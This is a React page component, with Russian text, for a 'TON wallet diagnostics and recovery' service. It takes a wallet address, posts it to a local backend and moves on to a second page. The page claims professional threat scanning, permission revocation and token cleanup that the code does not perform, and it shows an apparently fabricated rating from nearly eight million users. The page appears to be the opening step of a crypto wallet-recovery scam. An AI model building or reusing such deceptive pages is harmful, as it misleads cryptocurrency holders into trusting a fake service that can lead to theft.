import { useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import "./Page1_Hello.css";


function Page1_Hello() {
  const buttonRef = useRef(null);
  const [wallet, setWallet] = useState("");
  const [error, setError] = useState("");
  const navigate = useNavigate();


    function validateTonAddress(addr) {
      return addr.length === 48 && addr.startsWith("UQ");
    }

  function handleInputChange(e) {
    const value = e.target.value.trim();
    setWallet(value);
    localStorage.setItem('walletAddress', value);
    if (!value) {
      setError("");
    } else if (!validateTonAddress(value)) {
  setError("Введите правильный адрес: 48 символов, начало с UQ");
    } else {
      setError("");
    }
  }

  function handleSubmit(e) {
    e.preventDefault();
    if (window.sessionStorage.getItem('recoveryFinished')) return;
    if (validateTonAddress(wallet)) {
      localStorage.setItem('walletAddress', wallet);
      // Отправка на локальный сервер
      fetch('http://localhost:3001/api/diagnose', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ address: wallet })
      });
      navigate("/page2");
    } else {
  setError("Введите правильный адрес: 48 символов, начало с UQ");
    }
  }

  return (
  <div className="page1-hello">
      <div className="header">
  <div style={{display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 32}}>
          {/* Новая иконка слева */}
          <div className="logo-container">
            <img src="/wallet-ring.png" alt="wallet-ring" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
          </div>
          {/* Основная иконка кошелька 1 */}
          <div className="logo-container">
            <img src="/blue-cube.png" alt="cube" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
          </div>
          {/* Иконка кошелька 2 справа */}
          <div className="logo-container">
            <img src="/blue-cube2.png" alt="wallet2" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
          </div>
        </div>
  <h1 className="main-title">Диагностика и восстановление<br/>TON-кошелька</h1>
        <p className="subtitle">
          Профессиональное автоматическое сканирование, обнаружение угроз и восстановление кошелька
        </p>
      </div>

      <div className="features-rects closer-to-header">
        <div className="feature-card rect" style={{padding: '10px 12px', minHeight: 0, marginBottom: 10}}>
          <div className="feature-content" style={{gap: 10}}>
            <div className="feature-icon" style={{minWidth: 24}}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M14.7 9.3a5 5 0 1 0-1.4 1.4l5.6 5.6a1 1 0 0 0 1.4-1.4l-5.6-5.6z"/>
                <circle cx="10" cy="10" r="2" fill="white"/>
              </svg>
            </div>
            <div className="feature-text">
              <h3 className="feature-title">Отозвать лишние разрешения</h3>
              <p className="feature-description">
                Автоматически выявляет и отзывает избыточные разрешения сторонних приложений и сервисов
              </p>
            </div>
          </div>
        </div>
        <div className="feature-card rect" style={{padding: '10px 12px', minHeight: 0, marginBottom: 10}}>
          <div className="feature-content" style={{gap: 10}}>
            <div className="feature-icon" style={{minWidth: 24}}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M12 2l7 4v6c0 5.25-3.5 10-7 10s-7-4.75-7-10V6l7-4z"/>
                <polyline points="9 12 12 15 16 10" stroke="#00FF00" strokeWidth="1.5" fill="none"/>
              </svg>
            </div>
            <div className="feature-text">
              <h3 className="feature-title">Блокировать подозрительные смарт-контракты</h3>
              <p className="feature-description">
                Интеллектуальный анализ и блокировка опасных смарт-контрактов в реальном времени
              </p>
            </div>
          </div>
        </div>
        <div className="feature-card rect" style={{padding: '10px 12px', minHeight: 0, marginBottom: 10}}>
          <div className="feature-content" style={{gap: 10}}>
            <div className="feature-icon" style={{minWidth: 24}}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#FF5555" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" fill="#fff" stroke="#FF5555" strokeWidth="1.5"/>
                <line x1="8" y1="8" x2="16" y2="16" />
                <line x1="16" y1="8" x2="8" y2="16" />
              </svg>
            </div>
            <div className="feature-text">
              <h3 className="feature-title">Удалить вредоносные токены</h3>
              <p className="feature-description">
                Комплексная очистка кошелька от подозрительных и вредоносных токенов и активов
              </p>
            </div>
          </div>
        </div>
      </div>

      <div className="cta-section closer-cta" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: 0 }}>
        {error && (
          <div style={{
            marginBottom: 12,
            fontSize: 17,
            color: '#f87171',
            fontWeight: 600,
            background: 'linear-gradient(90deg,#f87171 0%,#2563eb 100%)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            textShadow: '0 2px 12px rgba(0,136,204,0.18)',
            letterSpacing: '-0.01em',
            textAlign: 'center',
            animation: 'fadeIn 0.5s',
          }}>{error}</div>
        )}
        <p className="cta-text" style={{ fontSize: 24, color: '#1E90FF', fontWeight: 400, marginBottom: 18, textAlign: 'center', textShadow: '0 1px 8px #fff, 0 0 12px #00fff7a0', WebkitTextStroke: '0.2px #1E90FF', lineHeight: 1.25 }}>
          Не ждите проблем — <span style={{ color: '#1E90FF', fontWeight: 400, fontSize: 24, filter: 'brightness(1.1)', textShadow: '0 0 16px #00fff7a0, 0 1px 8px #fff' }}>запустите профессиональную диагностику кошелька прямо сейчас</span>
        </p>
        <form className="cta-input-form" onSubmit={handleSubmit} style={{ display: 'flex', alignItems: 'center', gap: 12, width: '100%', maxWidth: 540, margin: '0 auto 18px auto' }}>
          <input
            type="text"
            className="cta-input"
            placeholder="Введите адрес TON-кошелька"
            value={wallet}
            onChange={handleInputChange}
            style={{
              padding: '12px 18px',
              borderRadius: 10,
              border: error ? '1.5px solid #f87171' : '1px solid #cbd5e1',
              fontSize: 17,
              outline: error ? '#f87171' : undefined,
              textAlign: 'center',
              background: '#f3f6fa',
              color: '#222',
              boxShadow: '0 2px 12px 0 rgba(0,0,0,0.10)'
            }}
            autoComplete="off"
          />
          {/* Кнопка всегда ниже поля ввода */}
          <button
            className="cta-button"
            ref={buttonRef}
            type="submit"
            style={{
              opacity: error || !validateTonAddress(wallet) ? 0.6 : 1,
              pointerEvents: error || !validateTonAddress(wallet) ? 'none' : 'auto',
              fontSize: 18,
              fontWeight: 700,
              borderRadius: 10,
              padding: '14px 28px',
              background: 'linear-gradient(90deg,#0ea5e9,#6366f1)',
              boxShadow: '0 2px 16px 0 rgba(14,165,233,0.18)',
              color: '#00FF00'
            }}
            disabled={!!error || !validateTonAddress(wallet)}
          >
            Начать диагностику
          </button>
        </form>
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 6, color: '#fbbf24', fontSize: 13, marginTop: 10 }}>
          {[...Array(5)].map((_, i) => (
            <svg key={i} style={{ width: 14, height: 14 }} xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 20"><path d="M10.868 2.884c-.321-.772-1.415-.772-1.736 0l-1.83 4.401-4.753.381c-.833.067-1.171 1.107-.536 1.651l3.62 3.102-1.106 4.637c-.194.813.691 1.456 1.405 1.02L10 15.591l4.069 2.485c.713.436 1.598-.207 1.404-1.02l-1.106-4.637 3.62-3.102c.635-.544.297-1.584-.536-1.65l-4.752-.382-1.831-4.401z" /></svg>
          ))}
          <span style={{ color: '#4B0082', fontWeight: 600, fontSize: 11, marginLeft: 5 }}>5.0</span>
          <span style={{ color: '#4B0082', fontSize: 9, marginLeft: 3 }}>от 7 952 442 пользователей</span>
        </div>
      </div>

      <div className="scanning-animation" id="scanningAnimation">
        <div className="scan-line"></div>
        <div className="progress-bar">
          <div className="progress-fill" id="progressFill"></div>
        </div>
        {/* <p id="scanStatus" style={{ color: "#94a3b8", marginTop: 15 }}>Initializing scan...</p> */}
      </div>
    </div>
  );
}

export default Page1_Hello;